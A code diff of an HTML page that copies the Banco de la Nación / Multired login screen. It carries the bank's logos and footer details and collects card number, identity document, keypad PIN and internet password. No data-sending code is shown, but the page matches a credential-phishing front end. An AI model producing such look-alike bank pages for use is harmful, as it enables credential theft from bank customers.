@@ -12,48 +12,45 @@
 </head>
 
 <body>
-
-    <header class="container-fluid bg-white text-center py-4" style="display: flex; justify-content: space-between; align-items: center;">
-        <img src="descarga.png" class="imagenbanco" alt="Multired" width="30" height="20" style="float:left;">
-        <img src="banconacion.jpg" alt="banconacion" width="30" height="20">
+    <div class="linea-roja"></div>
+    <header>
+        <div class="header-left">
+            <img src="multiRed.jpg">
+        </div>
+        <div class="header-right">
+            <img src="banconacion.jpg">
+        </div>
     </header>
+
     <div>
-        <h1 class="dax"><img src="descarga.jpg" alt="candado" width="15" height="15"> Usted se encuentra en una <span>zona segura</span></h1>
+        <h1 class="dax"><img src="descarga.jpg" alt="candado" width="15" height="15"> Usted se encuentra en una
+            <span style="color: rgb(199, 27, 27);">zona segura</span>
+        </h1>
     </div>
-    <div class="container-fluid justify-content-center">
-        <form id="login-form" action="#" method="post" onsubmit="return validateForm()">
-
-            <div class="mb-3">
-                <label for="card-type" class="form-label">Seleccione:</label>
-                <select id="card-type" name="card-type" class="form-select" required>
-                    <option value="">Seleccione una opción</option>
-                    <option value="multired-debito">Multired Global Débito</option>
-                    <option value="multired-credito">Multired Global Crédito</option>
+    <div class="form-container">
+        <form>
+            <div class="form-group">
+                <label for="tipo-tarjeta">Seleccione:</label>
+                <select id="tipo-tarjeta">
+                    <option value="debito">Tarjeta de Débito</option>
+                    <option value="credito">Tarjeta de Crédito</option>
                 </select>
             </div>
 
-            <div class="mb-3">
-                <label for="card-number" class="form-label">Número de tarjeta:</label>
-                <input type="text" id="card-number" name="card-number" maxlength="16" class="form-control"
-                    placeholder="Ingrese su número de tarjeta" required>
+            <div class="form-group">
+                <label for="numero-tarjeta">Número de Tarjeta:</label>
+                <input type="text" id="numero-tarjeta">
             </div>
 
-            <div class="mb-3">
-                <label for="document-type" class="form-label">Tipo y N° Documento:</label>
-                <select id="document-type" name="document-type" class="form-select" required>
-                    <option value="">Seleccione...</option>
+            <div class="form-group">
+                <label for="tipo-documento">Tipo y Número de Documento:</label>
+                <select id="tipo-documento">
                     <option value="dni">DNI</option>
-                    <option value="pasaporte">Pasaporte</option>
-                    <option value="ce">Carné de Extranjería</option>
+                    <option value="ce">Carnet de Extranjería</option>
                 </select>
+                <input type="text" id="numero-documento">
             </div>
-
-            <div class="mb-3">
-                <label for="document-number" class="form-label">Número de documento:</label>
-                <input type="text" id="document-number" name="document-number" maxlength="12" class="form-control"
-                    placeholder="Ingrese su N° de documento" required>
-            </div>
-
+            <label for="clave-teclado">Ingresa tu clave usando el teclado virtual:</label>
             <div class="grid">
                 <button class="casilla" id="casilla0"></button>
                 <button class="casilla" id="casilla1"></button>
@@ -64,13 +61,39 @@
                 <button class="casilla" id="casilla6"></button>
                 <button class="casilla" id="casilla7"></button>
                 <button class="casilla" id="casilla8"></button>
+                <button type="button">Limpiar</button>
             </div>
+            <div class="clave-internet">
+                <a href="claveInter.jpg">Genera tu clave de internet</a>
+                <p>Ingresa tu clave de internet (06 dígitos)</p>
+                <input type="password" id="clave-internet">
+                <a href="signo.jpg">Olvidé mi clave</a>
+            </div>
+            <label for="captcha">Ingresa el texto de la imagen:</label>
+            <div class="captcha-container">
+                <img src="captcha1.png" alt="Captcha">
+                <div class="boton_captcha" id="boton_captcha">Cambiar texto</div>
 
+                <input type="text" id="captcha">
+            </div>
+            <div class="linea-puntos"></div>
             <button class="btn btn-primary mt-4" onclick="generarNumeros()">GENERÉ SU CONTRASEÑA</button>
+            <button type="submit" class="btn-ingresar">Ingresar</button>
         </form>
     </div>
+    <footer class="pie-pagina">
+        <p>
+            <strong>Banco de la Nación | Ministerio de Economía y Finanzas</strong><br>
+            Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000. <br>
+            Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. <br>
+            Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).
+        </p>
+    </footer>
 
-    <script src="components.js"></script>
+
+
+
+    <script src=" components.js"></script>
 
 </body>
 
